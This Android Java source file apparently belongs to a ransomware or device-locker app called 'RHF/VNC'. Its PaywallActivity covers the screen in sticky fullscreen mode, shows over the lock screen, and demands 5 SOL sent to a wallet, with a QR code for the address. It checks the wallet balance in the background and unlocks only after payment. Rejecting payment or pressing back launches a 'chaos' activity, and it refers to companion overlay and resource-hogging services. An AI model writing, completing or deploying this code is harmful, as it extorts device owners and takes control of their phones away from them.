package com.rhfvnc.strain;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
public class PaywallActivity extends Activity {
    public static volatile boolean paid = false;
    public static volatile boolean rejected = false;
    private TextView status;
    private VideoView bg;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (paid) { launchChaos(); return; }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);
        bg = new VideoView(this);
        int rid = getResources().getIdentifier("mln", "raw", getPackageName());
        if (rid != 0) {
            Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + rid);
            bg.setVideoURI(u);
            bg.setOnPreparedListener(mp -> { mp.setLooping(true); mp.setVolume(0f, 0f); bg.start(); });
        }
        root.addView(bg, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        LinearLayout ui = new LinearLayout(this);
        ui.setOrientation(LinearLayout.VERTICAL);
        ui.setGravity(Gravity.CENTER);
        ui.setBackgroundColor(0x99000000);
        ui.setPadding(48, 48, 48, 48);
        TextView title = new TextView(this);
        title.setText("RHF/VNC");
        title.setTextColor(Color.RED);
        title.setTextSize(52);
        title.setGravity(Gravity.CENTER);
        ui.addView(title);
        TextView sub = new TextView(this);
        sub.setText("YOUR DEVICE IS LOCKED");
        sub.setTextColor(Color.RED);
        sub.setTextSize(18);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 8, 0, 32);
        ui.addView(sub);
        ImageView qr = new ImageView(this);
        LinearLayout.LayoutParams qlp = new LinearLayout.LayoutParams(500, 500);
        qr.setLayoutParams(qlp);
        ui.addView(qr);
        loadQr(qr);
        TextView addr = new TextView(this);
        addr.setText("Send 5 SOL to:\n" + SolanaCheck.WALLET);
        addr.setTextColor(Color.WHITE);
        addr.setTextSize(12);
        addr.setGravity(Gravity.CENTER);
        addr.setPadding(0, 24, 0, 24);
        ui.addView(addr);
        status = new TextView(this);
        status.setText("Waiting for payment...");
        status.setTextColor(Color.YELLOW);
        status.setTextSize(15);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 16, 0, 32);
        ui.addView(status);
        Button verify = new Button(this);
        verify.setText("I PAID - CHECK");
        verify.setOnClickListener(v -> checkNow());
        ui.addView(verify);
        Button reject = new Button(this);
        reject.setText("REJECT - I WILL NOT PAY");
        reject.setTextColor(Color.RED);
        reject.setOnClickListener(v -> { rejected = true; launchChaos(); });
        ui.addView(reject);
        root.addView(ui, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        setContentView(root);
        new Thread(() -> {
            while (!paid && !rejected) {
                try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
                if (paid || rejected) break;
                final long bal = SolanaCheck.getBalance();
                runOnUiThread(() -> {
                    if (bal >= 0) status.setText("Balance: " + (bal / 1_000_000_000.0) + " / 5 SOL");
                });
                if (bal >= SolanaCheck.REQUIRED_LAMPORTS) { doUnlock(); return; }
            }
        }).start();
    }
    private void doUnlock() {
        paid = true;
        runOnUiThread(() -> {
            Toast.makeText(this, "UNLOCKED", Toast.LENGTH_LONG).show();
            try { stopService(new Intent(this, OverlayService.class)); } catch (Throwable ignored) {}
            try { stopService(new Intent(this, StrainService.class)); } catch (Throwable ignored) {}
            try { stopService(new Intent(this, HogService1.class)); } catch (Throwable ignored) {}
            try { stopService(new Intent(this, HogService2.class)); } catch (Throwable ignored) {}
            try { stopService(new Intent(this, HogService3.class)); } catch (Throwable ignored) {}
            try {
                android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
                Intent ri = new Intent(this, StrainReceiver.class);
                ri.setAction(StrainReceiver.ACTION_RELAUNCH);
                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 1337, ri,
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
                am.cancel(pi);
            } catch (Throwable ignored) {}
            finishAffinity();
            android.os.Process.killProcess(android.os.Process.myPid());
        });
    }
    private void checkNow() {
        new Thread(() -> {
            long bal = SolanaCheck.getBalance();
            runOnUiThread(() -> status.setText(bal >= 0
                    ? "Balance: " + (bal / 1_000_000_000.0) + " / 5 SOL"
                    : "RPC error - try again"));
            if (bal >= SolanaCheck.REQUIRED_LAMPORTS) doUnlock();
        }).start();
    }
    private void loadQr(ImageView iv) {
        new Thread(() -> {
            try {
                String url = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" + SolanaCheck.WALLET;
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(8000); c.setReadTimeout(8000);
                InputStream in = c.getInputStream();
                Bitmap bm = BitmapFactory.decodeStream(in);
                in.close();
                runOnUiThread(() -> iv.setImageBitmap(bm));
            } catch (Throwable ignored) {}
        }).start();
    }
    private void launchChaos() {
        Intent i = new Intent(this, ChaosActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    @Override
    public void onBackPressed() { launchChaos(); }
}
